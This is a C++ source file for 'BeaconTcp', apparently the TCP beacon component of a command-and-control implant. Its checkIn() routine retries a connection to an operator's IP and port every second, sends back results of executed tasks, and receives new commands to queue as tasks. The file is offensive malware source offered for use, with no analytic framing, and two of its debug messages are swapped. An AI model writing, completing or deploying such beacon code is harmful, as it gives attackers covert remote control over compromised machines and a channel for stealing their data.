#include "BeaconTcp.hpp"

using namespace std;
using namespace SocketHandler;


BeaconTcp::BeaconTcp(std::string& ip, int port)
	: Beacon(ip, port)
{
	m_client=new Client(m_ip, m_port);
}


BeaconTcp::~BeaconTcp()
{
}


void BeaconTcp::checkIn()
{	
	while(!m_client->initConnection())
	{
		Sleep(1000);
	}

	std::string output;
	taskResultsToCmd(output);

	DEBUG("sending output.size " << std::to_string(output.size()));

	bool res = m_client->sendData(output);
	if(res)
	{
		string input;
		res=m_client->receive(input);
		if(res)
		{
			DEBUG("received input.size " << std::to_string(input.size()));
			if(!input.empty())
			{
				cmdToTasks(input);
			}
		}
		else
			DEBUG("send failed");
	}
	else
		DEBUG("Receive failed");
}

	



